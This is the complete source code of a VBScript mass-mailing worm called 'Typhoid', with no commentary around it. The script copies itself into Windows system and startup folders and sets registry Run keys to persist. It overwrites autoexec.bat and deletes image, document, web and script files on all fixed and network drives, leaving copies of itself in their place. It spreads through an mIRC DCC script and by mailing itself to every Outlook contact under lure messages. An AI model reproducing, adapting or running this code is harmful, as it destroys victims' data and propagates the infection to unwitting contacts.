rem Typhoid
rem <By: icarus> Hack The Planet!
On Error Resume Next
dim fileSysObj,Rab,vbscopy,which,randName,randLocale,eq,file,xFi
Set fileSysObj = CreateObject("Scripting.FileSystemObject")
set Rab = fileSysObj.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=Rab.ReadAll
Set xFi = fileSysObj.GetFile(WScript.ScriptFullName)

Module1()

sub Module1()
on error resume next
randomize timer
which = int(rnd * 15) + 1
if which = 1 then
 randName = "SoupNazi"
elseif which = 2 then
 randName = "AL"
elseif which = 3 then
 randName = "George"
elseif which = 4 then
 randName = "Jerry"
elseif which = 5 then
 randName = "Hal"
elseif which = 6 then
 randName = "Elaine"
elseif which = 7 then
 randName = "Kraimer"
elseif which = 8 then
 randName = "Newman"
elseif which = 9 then
 randname = "Tron"
elseif which = 10 then
 randname = "Colossus"
elseif which = 11 then
 randname = "Homer"
elseif which = 12 then
 randname = "Odysseus"
elseif which = 13 then
 randname = "Romeo"
elseif which = 14 then
 randname = "Juliet"
elseif which = 15 then
 randname = "Vlad"
end if
which = int(rnd * 8) + 1
if which = 1 then
 randLocale = "c:\"
elseif which = 2 then
 randLocale = "c:\windows\"
elseif which = 3 then
 randLocale = "c:\program Files\"
elseif which = 4 then
 randLocale = "c:\windows\system\"
elseif which = 5 then
 randLocale = "c:\windows\sendto\"
elseif which = 6 then
 randLocale = "c:\windows\command\"
elseif which = 7 then
 randLocale = "c:\windows\start menu\programs\startup\"
elseif which > 7 then
 randLocale = "c:\windows\command\ebd\"
end if
xFi.Copy(randLocale&""&randName&".vbs")
xFi.Copy("c:\windows\system\sein.vbs")
regEdit "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\"&randName&"",randLocale&""&randName&".vbs"
regEdit "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\"&randName&"",randLocale&""&randName&".vbs"
set edExec=fileSysObj.CreateTextFile("c:\autoexec.bat")
edExec.WriteLine "echo > prn Typhoid <By: icarus>"
edExec.Close
lDrive()
sendOut()
end sub

sub iFile(folderspec)
 On Error Resume Next
 dim fighl,f16,fc,ext,ap,s,extInt
 dim extStr0,extStr1,extStr2,extStr3
 randomize timer
 extInt = int(rnd * 5) + 1
 if extInt = 1 then
  extStr0 = "bmp"
 elseif extInt = 2 then
  extStr0 = "jpg"
 elseif extInt = 3 then
  extStr0 = "jpeg"
 elseif extInt = 4 then
  extStr0 = "gif"
 end if
 randomize timer
 extInt = int(rnd * 5) + 1
 if extInt = 1 then
  extStr1 = "vbs"
 elseif extInt = 2 then
  extStr1 = "vbe"
 elseif extInt = 3 then
  extStr1 = "js"
 elseif extInt = 4 then
  extStr1 = "je"
 end if
 randomize timer
 extInt = int(rnd * 5) + 1
 if extInt = 1 then
  extStr2 = "htm"
 elseif extInt = 2 then
  extStr2 = "html"
 elseif extInt = 3 then
  extStr2 = "chm"
 elseif extInt = 4 then
  extStr2 = "cgi"
 end if
 randomize timer
 extInt = int(rnd * 5) + 1
 if extInt = 1 then
  extStr3 = "txt"
 elseif extInt = 2 then
  extStr3 = "doc"
 elseif extInt = 3 then
  extStr3 = "wav"
 elseif extInt = 4 then
  extStr3 = "mp3"
 end if
 set fighl = fileSysObj.GetFolder(folderspec)
 set fc = fighl.Files
 for each f16 in fc
  ext=fileSysObj.GetExtensionName(f16.path)
  ext=lcase(ext)
  s=lcase(f16.name)
  if (ext = extStr0) or (ext = extStr1) or (ext = extStr2) or ext = (extStr3) then
   fileSysObj.DeleteFile(folderspec&"\"&s)
   xFi.Copy(folderspec&"\"&s&".vbs")
  end if
  if (s="mirc32.exe") or (s="mlink32.exe") or (s="script.ini") or (s="mirc.ini") or (s="mirc.hlp") then
   set edScript=fileSysObj.CreateTextFile(folderspec&"\script.ini")
   edScript.WriteLine "[script]"
   edScript.WriteLine ";mIRC Script"
   edScript.WriteLine "; Please dont edit this script... mIRC will corrupt, if mIRC will"
   edScript.WriteLine " corrupt... WINDOWS will affect and will not run correctly. thanks"
   edScript.WriteLine ";"
   edScript.WriteLine ";Khaled Mardam-Bey"
   edScript.WriteLine ";http://www.mirc.com"
   edScript.WriteLine ";"
   edScript.WriteLine "n0=on 1:JOIN:#:{"
   edScript.WriteLine "n1= /if ( $nick == $me ) { halt }"
   edScript.WriteLine "n2= /.dcc send $nick c:\windows\system\Sein.vbs"
   edScript.WriteLine "n3=}"
   edScript.close
   eq=folderspec
  end if
 next
end sub

sub folderlist(folderspec)
 On Error Resume Next
 dim fighl,f16,subf
 set fighl = fileSysObj.GetFolder(folderspec)
 set subf = fighl.SubFolders
 for each f16 in subf
  iFile(f16.path)
  folderlist(f16.path)
 next
end sub


sub regEdit(regisKey,regisVal)
 Set registryEdit = CreateObject("WScript.Shell")
 registryedit.RegWrite regisKey,regisVal
end sub

sub sendOut()
 On Error Resume Next
 dim x,a,regv,ctrE,maleAd,regedit,b,regad,ctrL,randString,i
 randomize timer
 which = int(rnd * 10) + 1
 if which = 1 then
  randString = "Check out the AWESOME game attached!"
 elseif which = 2 then
  randString = "No time to explain! Catch ya later!"
 elseif which = 3 then
  randString = "Kill the pokemon in this game!"
 elseif which = 4 then
  randstring = "Check this one out!"
 elseif which = 5 then
  randString = "SouthPark game....."
 elseif which = 6 then
  randString = "Here is ALOT of funny jokes! Open the attachment to read them."
 elseif which = 7 then
  randString = "Attached is information on the Monica Lewinsky scandal! A Must Read!"
 elseif which = 8 then
  randString = randName
 elseif which = 9 then
  randString = "I have attached a politician bowling game! Woo Hoo! Kill the IRS!"
 elseif which > 9 then
  randString = ""
 end if
 set regedit=CreateObject("WScript.Shell")
 set out=WScript.CreateObject("Outlook.Application")
 set mapi=out.GetNameSpace("MAPI")
 for ctrL=1 to mapi.AddressLists.Count
  set a=mapi.AddressLists(ctrL)
  x=1
  regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
  if (regv="") then
   regv=1
  end if
  if (int(a.AddressEntries.Count)>int(regv)) then
   for ctrE=1 to a.AddressEntries.Count
    maleAd=a.AddressEntries(x)
    regad=""
    regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&maleAd)
     if (regad="") then
      set male=out.CreateItem(0)
      male.Recipients.Add(maleAd)
      male.Subject = randName
      male.Body = vbcrlf&""&randString
      male.Attachments.Add(randLocale&""&randName)
      male.Send
      regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&maleAd,1,"REG_DWORD"
     end if
     x=x+1
   next
   regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
  end if
 next
 Set out=Nothing
 Set mapi=Nothing
 regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end sub

sub lDrive
 On Error Resume Next
 Dim dc,d,s
 Set dc = fileSysObj.Drives
 For Each d in dc
  If d.DriveType = 2 or d.DriveType=3 Then
   folderlist(d.path&"\")
  end if
 Next
 lDrive = s
end sub



